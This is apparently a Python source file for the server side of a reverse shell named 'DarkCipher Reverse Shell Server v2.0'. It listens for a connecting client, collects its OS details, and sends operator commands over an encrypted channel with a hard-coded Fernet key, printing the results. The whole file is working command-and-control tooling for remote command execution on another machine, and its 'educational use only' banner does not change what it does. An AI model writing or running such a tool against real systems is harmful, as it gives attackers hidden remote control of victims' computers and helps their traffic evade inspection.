import socket
from cryptography.fernet import Fernet

# Must match the client key exactly!
SECRET_KEY = b'3QnL_4-vkUB45Vfi5MwDTRSOKaaEBhPY-q5Whh4bfyo='
fernet = Fernet(SECRET_KEY)

def load_encryption_key():
    """Returns the symmetric encryption object (Fernet)"""
    return fernet

def encrypt_message(message, fernet_obj):
    """Encrypts plaintext string and returns bytes"""
    return fernet_obj.encrypt(message.encode())

def decrypt_message(ciphertext, fernet_obj):
    """Decrypts bytes and returns plaintext string"""
    return fernet_obj.decrypt(ciphertext).decode()

def get_local_ip():
    """Detects and returns the local outbound IP"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def start_server(host, port):
    """Starts TCP server, accepts connection and handles commands"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"[+] Listening on {host}:{port}... Waiting for connection.")

    client_socket, client_address = server.accept()
    print(f"[+] Connection established from {client_address}")

    return server, client_socket

def receive_client_info(client_socket, fernet_obj):
    """Receives and decrypts client OS info"""
    encrypted_os_info = client_socket.recv(1024)
    os_info = decrypt_message(encrypted_os_info, fernet_obj)
    print(f"[+] Client OS info: {os_info}")

def interactive_shell(client_socket, fernet_obj):
    """Main loop: prompt user, send encrypted command, receive & decrypt output"""
    while True:
        cmd = input("Enter command (or 'exit' to quit): ").strip()
        if not cmd:
            continue
        if cmd.lower() == "exit":
            print("[*] Exiting.")
            break

        # Encrypt and send command
        encrypted_cmd = encrypt_message(cmd, fernet_obj)
        client_socket.send(encrypted_cmd)

        # Receive and decrypt response
        encrypted_response = client_socket.recv(4096)
        response = decrypt_message(encrypted_response, fernet_obj)
        print(response)

def print_banner():
    """Displays program banner"""
    print("""
██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗
██║  ██║███████║██████╔╝█████╔╝ ██║     ██║██████╔╝███████║█████╗  ██████╔╝
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╗██║██║     ██║  ██║███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

[*] DarkCipher Reverse Shell Server v2.0
[*] Educational Use Only - Authorized Testing Required
[*] ================================================
""")

if __name__ == "__main__":
    fernet_obj = load_encryption_key()
    print_banner()

    detected_ip = get_local_ip()
    print(f"[+] Detected local IP: {detected_ip}")

    host = input(f"Enter IP to listen on (press Enter to use detected IP): ").strip()
    if not host:
        host = detected_ip

    port = int(input("Enter port to listen on: "))

    try:
        server, client_socket = start_server(host, port)
        receive_client_info(client_socket, fernet_obj)
        interactive_shell(client_socket, fernet_obj)
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()
        server.close()
        print("[*] Server stopped.")
